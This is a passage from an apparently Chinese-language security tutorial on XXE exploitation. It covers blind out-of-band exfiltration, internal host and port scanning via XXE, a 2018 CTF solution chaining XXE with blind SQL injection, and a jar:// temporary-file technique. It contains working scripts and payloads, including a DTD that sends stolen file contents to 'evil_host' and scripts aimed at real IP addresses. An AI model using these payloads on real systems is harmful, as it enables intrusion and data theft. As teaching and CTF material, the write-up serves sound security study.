就会去获取服务器上面的敏感文件（file传入到send的过程中已经执行，传入到send是已经得到的值），然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p><h4 id="新的思考："><a href="#新的思考：" class="headerlink" title="新的思考："></a>新的思考：</h4><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p><h4 id="新的利用："><a href="#新的利用：" class="headerlink" title="新的利用："></a>新的利用：</h4><p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议</p><p><strong>如图所示:</strong></p><p><img src="https://i.imgur.com/QsNmhnD.png" alt=""></p><p>PHP在安装扩展以后还能支持的协议：</p><p><strong>如图所示：</strong></p><p><img src="https://i.imgur.com/yagSMz8.png" alt=""></p><p><strong>注意：</strong></p><p>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7<br>update 7 和 Oracle JDK 1.6 update 35<br>2.libxml 是 PHP 的 xml 支持</p><h3 id="实验三：HTTP-内网主机探测"><a href="#实验三：HTTP-内网主机探测" class="headerlink" title="实验三：HTTP 内网主机探测"></a>实验三：HTTP 内网主机探测</h3><p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p><p><strong>下面是一个探测脚本的实例：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#Origtional XML that the server accepts</span></span><br><span class="line"><span class="comment">#&lt;xml&gt;</span></span><br><span class="line"><span class="comment">#    &lt;stuff&gt;user&lt;/stuff&gt;</span></span><br><span class="line"><span class="comment">#&lt;/xml&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_xml</span><span class="params">(string)</span>:</span></span><br><span class="line">    xml = <span class="string">"""&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;!ENTITY xxe SYSTEM """</span> + <span class="string">'"'</span> + string + <span class="string">'"'</span> + <span class="string">"""&gt;]&gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;xml&gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;"""</span></span><br><span class="line">    xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;/xml&gt;"""</span></span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_xml</span><span class="params">(xml)</span>:</span></span><br><span class="line">    headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>&#125;</span><br><span class="line">    x = requests.post(<span class="string">'http://34.200.157.128/CUSTOM/NEW_XEE.php'</span>, data=xml, headers=headers, timeout=<span class="number">5</span>).text</span><br><span class="line">    coded_string = x.split(<span class="string">' '</span>)[<span class="number">-2</span>] <span class="comment"># a little split to get only the base64 encoded value</span></span><br><span class="line">    <span class="keyword">print</span> coded_string</span><br><span class="line"><span class="comment">#   print base64.b64decode(coded_string)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = str(i)</span><br><span class="line">        ip = <span class="string">'10.0.0.'</span> + i</span><br><span class="line">        string = <span class="string">'php://filter/convert.base64-encode/resource=http://'</span> + ip + <span class="string">'/'</span></span><br><span class="line">        <span class="keyword">print</span> string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div><p><strong>返回结果：</strong></p><p><img src="https://i.imgur.com/iqZlZdf.png" alt=""></p><h3 id="实验四：HTTP-内网主机端口扫描"><a href="#实验四：HTTP-内网主机端口扫描" class="headerlink" title="实验四：HTTP 内网主机端口扫描"></a>实验四：HTTP 内网主机端口扫描</h3><p>找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测</p><p><strong>比如我们传入：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">data</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://127.0.0.1:515/"</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">data</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>4<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><strong>返回结果：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.bind.UnmarshalException  </span><br><span class="line"> - with linked exception:</span><br><span class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException</span><br><span class="line">Exception Description: An <span class="builtin-name">error</span> occurred unmarshalling the document  </span><br><span class="line">Internal Exception: ████████████████████████:<span class="built_in"> Connection </span>refused</span><br></pre></td></tr></table></figure></div><p>这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测</p><p><strong>如下图所示：</strong></p><p><img src="https://i.imgur.com/HpfpmxB.png" alt=""></p><p>至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接getshell 的 比如 strus2）</p><h3 id="实验五：内网盲注-CTF"><a href="#实验五：内网盲注-CTF" class="headerlink" title="实验五：内网盲注(CTF)"></a><strong>实验五：内网盲注(CTF)</strong></h3><p>2018 强网杯 有一道题就是利用 XXE 漏洞进行内网的 SQL 盲注的,大致的思路如下：</p><p>首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错</p><p><strong>如图所示：</strong></p><p><img src="https://i.imgur.com/PZigmLG.png" alt=""></p><p><img src="https://i.imgur.com/nOLt3zk.png" alt=""></p><p>既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD )</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/var/</span>www<span class="regexp">/52dandan.cc/</span>public_html<span class="regexp">/config.php</span></span><br></pre></td></tr></table></figure></div><p>拿到第一部分 flag</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PUPPET"><figure class="iseeu highlight /puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">define</span>(<span class="section">BASEDIR</span>, <span class="string">"/var/www/52dandan.club/"</span>);</span><br><span class="line"><span class="keyword">define</span>(<span class="section">FLAG_SIG</span>, 1);</span><br><span class="line"><span class="keyword">define</span>(<span class="section">SECRETFILE</span>,<span class="string">'/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431'</span>);</span><br><span class="line">....</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><p><strong>注意：</strong></p><p>这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php<br>过滤器的一个压缩的方法</p><p>压缩：echo file_get_contents(“php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd”);<br>解压：echo file_get_contents(“php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1”);</p><p>然后我们考虑内网有没有东西，我们读取</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta-keyword">/proc/</span>net/arp</span><br><span class="line"><span class="meta-keyword">/etc/</span>host</span><br></pre></td></tr></table></figure></div><p>找到内网的另一台服务器的 ip 地址 192.168.223.18</p><p>拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个 test.php ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子</p><p><strong>示例代码：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = 'http://39.107.33.75:33899/common.php'</span><br><span class="line">s = requests.Session()</span><br><span class="line">result = ''</span><br><span class="line">data = &#123;</span><br><span class="line">        "name":"evil_man",</span><br><span class="line">        "email":"testabcdefg@gmail.com",</span><br><span class="line">        "comment":"""<span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line">                <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta">                <span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://evil_host/evil.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">                %dtd;]&gt;</span></span><br><span class="line">                """</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for i in range(0,28):</span><br><span class="line">        for j in range(48,123):</span><br><span class="line">                f = open('./evil.dtd','w')</span><br><span class="line">            payload2 = """<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary('&#123;&#125;'))then(0)else(1)end)-'1"</span>&gt;</span></span><br><span class="line">                <span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY % send SYSTEM 'http://evil_host/?result=%file;'&gt;"</span>&gt;</span></span><br><span class="line">                %all;</span><br><span class="line">                %send;""".format('_'*i+chr(j)+'_'*(27-i))</span><br><span class="line">                f.write(payload2)</span><br><span class="line">                f.close()</span><br><span class="line">                print 'test &#123;&#125;'.format(chr(j))</span><br><span class="line">                r = s.post(url,data=data)</span><br><span class="line">                if "Oti3a3LeLPdkPkqKF84xs=" in r.content and chr(j)!='_':</span><br><span class="line">                        result += chr(j)</span><br><span class="line">                        print chr(j)</span><br><span class="line">                        break</span><br><span class="line">print result</span><br></pre></td></tr></table></figure></div><p>这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解</p><h3 id="实验六：文件上传"><a href="#实验六：文件上传" class="headerlink" title="实验六：文件上传"></a><strong>实验六：文件上传</strong></h3><p>我们之前说的好像都是 php 相关，但是实际上现实中很多都是 java 的框架出现的 XXE 漏洞，通过阅读文档，我发现 Java 中有一个比较神奇的协议 jar:// ， php 中的 phar:// 似乎就是为了实现 jar:// 的类似的功能设计出来的。</p><p><strong>jar:// 协议的格式：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DUST"><figure class="iseeu highlight /dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">jar:</span><span class="template-variable">&#123;url&#125;</span><span class="xml">!</span><span class="template-variable">&#123;path&#125;</span></span><br></pre></td></tr></table></figure></div><p><strong>实例：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">jar:</span><span class="string">http:</span><span class="comment">//host/application.jar!/file/within/the/zip</span></span><br><span class="line"></span><br><span class="line">这个 ! 后面就是其需要从中解压出的文件</span><br></pre></td></tr></table></figure></div><p>jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar:// 是没法远程加载文件的（因此 phar:// 一般用于绕过文件上传，在一些2016年的HCTF中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018年的 blackhat 讲述的 phar:// 的反序列化很有趣，Orange 曾在2017年的 hitcon 中出过这道题）</p><p><strong>jar 协议处理文件的过程：</strong></p><p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p><blockquote><p><strong>那么我们怎么找到我们下载的临时文件呢？</strong></p><p>因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用</p></blockquote><p>下面是我的一些测试过程：</p><p>我首先在本地模拟一个存在 XXE 的程序，网上找的能直接解析 XML 文件的 java 源码</p><p><strong>示例代码：</strong></p><p><strong>xml_test.java</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="REASONML"><figure class="iseeu highlight /reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">package xml_test;</span><br><span class="line">import java.io.File;</span><br><span class="line"></span><br><span class="line">import javax.xml.parsers.DocumentBuilder;</span><br><span class="line">import javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"></span><br><span class="line">import org.w3c.dom.Attr;</span><br><span class="line">import org.w3c.dom.Comment;</span><br><span class="line">import org.w3c.dom.Document;</span><br><span class="line">import org.w3c.dom.Element;</span><br><span class="line">import org.w3c.dom.NamedNodeMap;</span><br><span class="line">import org.w3c.dom.Node;</span><br><span class="line">import org.w3c.dom.NodeList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用递归解析给定的任意一个xml文档并且将其内容输出到命令行上</span></span><br><span class="line"><span class="comment"> * @author zhanglong</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="keyword">class</span> xml_test</span><br><span class="line">&#123;</span><br><span class="line">    public static void main(String<span class="literal">[]</span> args) throws Exception</span><br><span class="line">    &#123;</span><br><span class="line">        DocumentBuilderFactory dbf = <span class="module-access"><span class="module"><span class="identifier">DocumentBuilderFactory</span>.</span></span><span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br><span class="line">        DocumentBuilder db = dbf.<span class="keyword">new</span><span class="constructor">DocumentBuilder()</span>;</span><br><span class="line"></span><br><span class="line">        Document doc = db.parse(<span class="keyword">new</span> <span class="constructor">File(<span class="string">"student.xml"</span>)</span>);</span><br><span class="line">        <span class="comment">//获得根元素结点</span></span><br><span class="line">        Element root = doc.get<span class="constructor">DocumentElement()</span>;</span><br><span class="line"></span><br><span class="line">        parse<span class="constructor">Element(<span class="params">root</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> static void parse<span class="constructor">Element(Element <span class="params">element</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        String tagName = element.get<span class="constructor">NodeName()</span>;</span><br><span class="line"></span><br><span class="line">        NodeList children = element.get<span class="constructor">ChildNodes()</span>;</span><br><span class="line"></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.print(<span class="string">"&lt;"</span> + tagName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//element元素的所有属性所构成的NamedNodeMap对象，需要对其进行判断</span></span><br><span class="line">        NamedNodeMap map = element.get<span class="constructor">Attributes()</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果该元素存在属性</span></span><br><span class="line">        <span class="keyword">if</span>(null != map)</span><br><span class="line">        &#123;</span><br><span class="line">            for(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; map.get<span class="constructor">Length()</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//获得该元素的每一个属性</span></span><br><span class="line">                Attr attr = (Attr)map.item(i);</span><br><span class="line"></span><br><span class="line">                String attrName = attr.get<span class="constructor">Name()</span>;</span><br><span class="line">                String attrValue = attr.get<span class="constructor">Value()</span>;</span><br><span class="line"></span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.print(<span class="string">" "</span> + attrName + <span class="string">"=\""</span> + attrValue + <span class="string">"\""</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.print(<span class="string">"&gt;"</span>);</span><br><span class="line"></span><br><span class="line">        for(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; children.get<span class="constructor">Length()</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Node node = children.item(i);</span><br><span class="line">            <span class="comment">//获得结点的类型</span></span><br><span class="line">            short nodeType = node.get<span class="constructor">NodeType()</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(nodeType<span class="operator"> == </span>Node.ELEMENT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//是元素，继续递归</span></span><br><span class="line">                parse<span class="constructor">Element((Element)</span>node);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nodeType<span class="operator"> == </span>Node.TEXT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//递归出口</span></span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.print(node.get<span class="constructor">NodeValue()</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nodeType<span class="operator"> == </span>Node.COMMENT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.print(<span class="string">"&lt;!--"</span>);</span><br><span class="line"></span><br><span class="line">                Comment comment = (Comment)node;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//注释内容</span></span><br><span class="line">                String data = comment.get<span class="constructor">Data()</span>;</span><br><span class="line"></span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.print(data);</span><br><span class="line"></span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.print(<span class="string">"--&gt;"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.print(<span class="string">"&lt;/"</span> + tagName + <span class="string">"&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>有了这个源码以后，我们需要在本地建立一个 xml 文件 ，我取名为 student.xml</p><p><strong>student.xml</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"jar:http://localhost:9999/jar.zip!/wm.php"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">convert</span>&gt;</span><span class="symbol">&amp;remote;</span><span class="tag">&lt;/<span class="name">convert</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><strong>目录结构如下图：</strong></p><p><img src="https://i.imgur.com/SFBWxXl.png" alt=""></p><p>可以清楚地看到我的请求是向自己本地的 9999 端口发出的，那么9999 端口上有什么服务呢？实际上是我自己用 python 写的一个 TCP 服务器</p><p><strong>示例代码：</strong></p><p><strong>sever.py</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> threading </span><br><span class="line"><span class="keyword">import</span> socketserver </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote </span><br><span class="line"><span class="keyword">import</span> http.client <span class="keyword">as</span> httpc </span><br><span class="line"></span><br><span class="line">listen_host = <span class="string">'localhost'</span> </span><br><span class="line">listen_port = <span class="number">9999</span> </span><br><span class="line">jar_file = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JarRequestHandler</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        http_req = <span class="string">b''</span></span><br><span class="line">        print(<span class="string">'New connection:'</span>,self.client_address)</span><br><span class="line">        <span class="keyword">while</span> <span class="string">b'\r\n\r\n'</span> <span class="keyword">not</span> <span class="keyword">in</span> http_req:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                http_req += self.request.recv(<span class="number">4096</span>)</span><br><span class="line">                print(<span class="string">'Client req:\r\n'</span>,http_req.decode())</span><br><span class="line">                jf = open(jar_file, <span class="string">'rb'</span>)</span><br><span class="line">                contents = jf.read()</span><br><span class="line">                headers = (<span class="string">'''HTTP/1.0 200 OK\r\n'''</span></span><br><span class="line">                <span class="string">'''Content-Type: application/java-archive\r\n\r\n'''</span>)</span><br><span class="line">                self.request.sendall(headers.encode(<span class="string">'ascii'</span>))</span><br><span class="line"></span><br><span class="line">                self.request.sendall(contents[:<span class="number">-1</span>])</span><br><span class="line">                time.sleep(<span class="number">30</span>)</span><br><span class="line">                print(<span class="number">30</span>)</span><br><span class="line">                self.request.sendall(contents[<span class="number">-1</span>:])</span><br><span class="line"></span><br><span class="line">            <span 